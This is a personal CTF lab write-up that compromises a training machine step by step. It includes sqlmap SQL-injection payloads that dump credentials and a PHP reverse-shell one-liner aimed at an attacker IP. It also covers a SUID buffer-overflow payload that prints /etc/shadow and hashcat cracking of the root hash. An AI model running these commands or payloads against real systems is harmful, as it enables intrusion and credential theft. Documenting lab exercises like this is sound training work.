# CTF
A note containing my adventures and documentation for cyber security quests


# Host Enumaration 
Nmap 7.93 scan initiated Mon Jan  9 00:22:49 2023 as:
nmap -p 22,80 -sV -sC -A -oN nmap_initial.txt 10.10.57.175
Nmap scan report for 10.10.57.175
Host is up (0.24s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.8 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 6d2c401b6c157cfcbf9b5522612a56fc (RSA)
|   256 ff893298f4779c0939f5af4a4f08d6f5 (ECDSA)
|_  256 899263e71d2b3aaf6cf939565b557ef9 (ED25519)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Apache2 Ubuntu Default Page: It works
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Aggressive OS guesses: Linux 3.10 - 3.13 (95%), Linux 5.4 (95%), ASUS RT-N56U WAP (Linux 3.4) (95%), Linux 3.16 (95%), Linux 3.1 (93%), Linux 3.2 (93%), AXIS 210A or 211 Network Camera (Linux 2.6.17) (92%), Sony Android TV (Android 5.0) (92%), Android 5.0 - 6.0.1 (Linux 3.4) (92%), Android 5.1 (92%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE (using port 80/tcp)
HOP RTT       ADDRESS
1   244.26 ms 10.18.0.1
2   244.50 ms 10.10.57.175

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Mon Jan  9 00:23:23 2023 -- 1 IP address (1 host up) scanned in 34.70 seconds


# Web Enumeration 
```
└─$ gobuster -x php,txt,html dir -u http://10.10.57.175 -w /usr/share/wordlists/dirb/big.txt
===============================================================
Gobuster v3.4
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.10.57.175
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.4
[+] Extensions:              html,php,txt
[+] Timeout:                 10s
===============================================================
2023/01/09 00:43:32 Starting gobuster in directory enumeration mode
===============================================================
/.htaccess            (Status: 403) [Size: 277]
/.htaccess.php        (Status: 403) [Size: 277]
/.htaccess.html       (Status: 403) [Size: 277]
/.htaccess.txt        (Status: 403) [Size: 277]
/.htpasswd            (Status: 403) [Size: 277]
/.htpasswd.txt        (Status: 403) [Size: 277]
/.htpasswd.php        (Status: 403) [Size: 277]
/.htpasswd.html       (Status: 403) [Size: 277]
/administrator.php    (Status: 200) [Size: 409]
/index.html           (Status: 200) [Size: 10918]
/server-status        (Status: 403) [Size: 277]
Progress: 65862 / 81880 (80.44%)[ERROR] 2023/01/09 01:11:02 [!] Get "http://10.10.57.175/shop_image.php": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 81212 / 81880 (99.18%)[ERROR] 2023/01/09 01:17:35 [!] Get "http://10.10.57.175/yasitemap.txt": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 81876 / 81880 (100.00%)
===============================================================
2023/01/09 01:18:01 Finished
===============================================================

```

#  Web Exploitation 
```
aaron㉿kali)-[~/…/share/sqlmap/output/10.10.57.175]
└─$ sqlmap -u http://10.10.57.175/administrator.php --forms -dump       
        ___
       __H__                                                                                                                                                                                                                                
 ___ ___[.]_____ ___ ___  {1.6.12#stable}                                                                                                                                                                                                   
|_ -| . ["]     | .'| . |                                                                                                                                                                                                                   
|___|_  [)]_|_|_|__,|  _|                                                                                                                                                                                                                   
      |_|V...       |_|   https://sqlmap.org                                                                                                                                                                                                

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 02:28:58 /2023-01-09/

[02:28:58] [INFO] testing connection to the target URL
[02:28:59] [INFO] searching for forms
[1/1] Form:
POST http://10.10.57.175/administrator.php
POST data: username=&password=
do you want to test this form? [Y/n/q] 
> y
Edit POST data [default: username=&password=] (Warning: blank fields detected): 
do you want to fill blank fields with random values? [Y/n] y
[02:29:07] [INFO] resuming back-end DBMS 'mysql' 
[02:29:07] [INFO] using '/home/aaron/.local/share/sqlmap/output/results-01092023_0229am.csv' as the CSV results file in multiple targets mode
sqlmap resumed the following injection point(s) from stored session:
---
Parameter: username (POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: username=FeRX' RLIKE (SELECT (CASE WHEN (4950=4950) THEN 0x46655258 ELSE 0x28 END))-- uWVW&password=

    Type: error-based
    Title: MySQL >= 5.6 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (GTID_SUBSET)
    Payload: username=FeRX' AND GTID_SUBSET(CONCAT(0x7162787071,(SELECT (ELT(9556=9556,1))),0x7170717871),9556)-- MVfY&password=

    Type: time-based blind
    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)
    Payload: username=FeRX' AND (SELECT 3396 FROM (SELECT(SLEEP(5)))qyVz)-- BdMJ&password=
---
do you want to exploit this SQL injection? [Y/n] y
[02:29:11] [INFO] the back-end DBMS is MySQL
web server operating system: Linux Ubuntu 16.10 or 16.04 (yakkety or xenial)
web application technology: Apache 2.4.18
back-end DBMS: MySQL >= 5.6
[02:29:11] [WARNING] missing database parameter. sqlmap is going to use the current database to enumerate table(s) entries
[02:29:11] [INFO] fetching current database
[02:29:11] [INFO] resumed: 'users'
[02:29:11] [INFO] fetching tables for database: 'users'
[02:29:11] [INFO] resumed: 'users'
[02:29:11] [INFO] fetching columns for table 'users' in database 'users'
[02:29:11] [INFO] resumed: 'username'
[02:29:11] [INFO] resumed: 'varchar(100)'
[02:29:11] [INFO] resumed: 'password'
[02:29:11] [INFO] resumed: 'varchar(100)'
[02:29:11] [INFO] fetching entries for table 'users' in database 'users'
[02:29:11] [INFO] resumed: 'secretpass'
[02:29:11] [INFO] resumed: 'pingudad'
Database: users
Table: users
[1 entry]
+------------+----------+
| password   | username |
+------------+----------+
| secretpass | pingudad |
+------------+----------+

[02:29:11] [INFO] table 'users.users' dumped to CSV file '/home/aaron/.local/share/sqlmap/output/10.10.57.175/dump/users/users.csv'
[02:29:11] [INFO] you can find results of scanning in multiple targets mode inside the CSV file '/home/aaron/.local/share/sqlmap/outp

[*] ending @ 02:29:11 /2023-01-09/

```

# Command Execution

``` set up my listener using netcat
nc -l -v -p 443

``` I used the php reversed shell in this site : 
```https://highon.coffee/blog/reverse-shell-cheat-sheet/#php-reverse-shell

php -r '$sock=fsockopen("ATTACKING-IP",80);exec("/bin/sh -i <&3 >&3 2>&3");'

``` once i get my access i find the password using find command
find / -user “www-data” -name “*” 2>/dev/null
````
/var/hidden/pass
$ cat /var/hidden/pass
pinguapingu

# LinEnum Linpeash
```` Since I already have the password, I copied linpeash from my machine to the victim computer
└─$ scp /opt linpeas.sh pingu@10.10.1.224:/tmp
pingu@10.10.1.224's password: 
scp: local "/opt" is not a regular file
scp: failed to upload file /opt to /tmp
linpeas.sh   

═══════════════════════════════╣ Interesting Files ╠═══════════════════════════════                                                  
                               ╚═══════════════════╝                                                                                 
╔══════════╣ SUID - Check easy privesc, exploits and write perms
╚ https://book.hacktricks.xyz/linux-hardening/privilege-escalation#sudo-and-suid                                                     
-r-sr-xr-x 1 root papa 7.4K Jan 16  2020 /opt/secret/root (Unknown SUID binary!)                                                     
-rwsr-xr-x 1 root root 134K Jul  4  2017 /usr/bin/sudo  --->  check_if_the_sudo_version_is_vulnerable
-rwsr-xr-x 1 root root 11K May  8  2018 /usr/bin/vmware-user-suid-wrapper
-rwsr-xr-x 1 root root 40K May 16  2017 /usr/bin/chsh
-rwsr-xr-x 1 root root 53K May 16  2017 /usr/bin/passwd  --->  Apple_Mac_OSX(03-2006)/Solaris_8/9(12-2004)/SPARC_8/9/Sun_Solaris_2.3_to_2.5.1(02-1997)        

`````

# PwnDbg

````
gdb /opt/secret/root
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word"...


which gdb
pwndbg: loaded 178 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from /opt/secret/root...(no debugging symbols found)...done.
pwndbg> 
pwndbg> 
pwndbg> which gdb
Undefined command: "which".  Try "help".
pwndbg> r < <(cyclic 50)
Starting program: /opt/secret/root < <(cyclic 50)

00:0000│ esp  0xff881880 ◂— 0xf700616d /* 'ma' */
01:0004│      0xff881884 —▸ 0xff8818a0 ◂— 0x1
02:0008│      0xff881888 ◂— 0x0
03:000c│      0xff88188c —▸ 0xf75a6637 (__libc_start_main+247) ◂— add    esp, 0x10
04:0010│      0xff881890 —▸ 0xf7740000 (_GLOBAL_OFFSET_TABLE_) ◂— mov    al, 0x1d /* 0x1b1db0 */
... ↓
06:0018│      0xff881898 ◂— 0x0
07:001c│      0xff88189c —▸ 0xf75a6637 (__libc_start_main+247) ◂— add    esp, 0x10
────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────
 ► f 0 6161616c
   f 1 f700616d
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
Program received signal SIGSEGV (fault address 0x6161616c)
pwndbg> 
pwndbg> which gdb
Undefined command: "which".  Try "help".
pwndbg> ls
linpeas.sh  pwndbg  systemd-private-7a2ffe9d4a324ce2bf9b1ba77cacd137-systemd-timesyncd.service-MYD8Uu  tmux-1002  VMwareDnD
pwndbg> cyclic -l 0x6161616c
44

````

# binary Exploitation
```
pingu@ubuntu:/tmp$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˄
pingu@ubuntu:/tmp$ python -c 'import struct;print "A"*44 + struct.pack("<I",0x080484cb)'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA˄
pingu@ubuntu:/tmp$ python -c 'print "A"*44 + "\xcb\x84\x04\x08"' | /opt/secret/root
root:$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:18277:0:99999:7:::
daemon:*:17953:0:99999:7:::
bin:*:17953:0:99999:7:::
sys:*:17953:0:99999:7:::
sync:*:17953:0:99999:7:::
games:*:17953:0:99999:7:::
man:*:17953:0:99999:7:::
lp:*:17953:0:99999:7:::
mail:*:17953:0:99999:7:::
news:*:17953:0:99999:7:::
uucp:*:17953:0:99999:7:::
proxy:*:17953:0:99999:7:::
www-data:*:17953:0:99999:7:::
backup:*:17953:0:99999:7:::
list:*:17953:0:99999:7:::
irc:*:17953:0:99999:7:::
gnats:*:17953:0:99999:7:::
nobody:*:17953:0:99999:7:::
systemd-timesync:*:17953:0:99999:7:::
systemd-network:*:17953:0:99999:7:::
systemd-resolve:*:17953:0:99999:7:::
systemd-bus-proxy:*:17953:0:99999:7:::
syslog:*:17953:0:99999:7:::
_apt:*:17953:0:99999:7:::
messagebus:*:18277:0:99999:7:::
uuidd:*:18277:0:99999:7:::
papa:$1$ORU43el1$tgY7epqx64xDbXvvaSEnu.:18277:0:99999:7:::
Segmentation fault
pingu@ubuntu:/tmp$ 
```
# Finishing the job
```
└─$ hashcat -m 1800 for_hashcat.txt /usr/share/wordlists/rockyou.txt 
hashcat (v6.2.6) starting

OpenCL API (OpenCL 3.0 PoCL 3.0+debian  Linux, None+Asserts, RELOC, LLVM 14.0.6, SLEEF, DISTRO, POCL_DEBUG) - Platform #1 [The pocl project]
============================================================================================================================================
$6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.oYtoF1KglS3YWoExtT3cvA3ml9UtDS8PFzCk902AsWx00Ck.:love2fish
                                                          
Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 1800 (sha512crypt $6$, SHA512 (Unix))
Hash.Target......: $6$rFK4s/vE$zkh2/RBiRZ746OW3/Q/zqTRVfrfYJfFjFc2/q.o...x00Ck.
Time.Started.....: Tue Jan 10 21:47:52 2023 (10 mins, 46 secs)
Time.Estimated...: Tue Jan 10 21:58:38 2023 (0 secs)

```

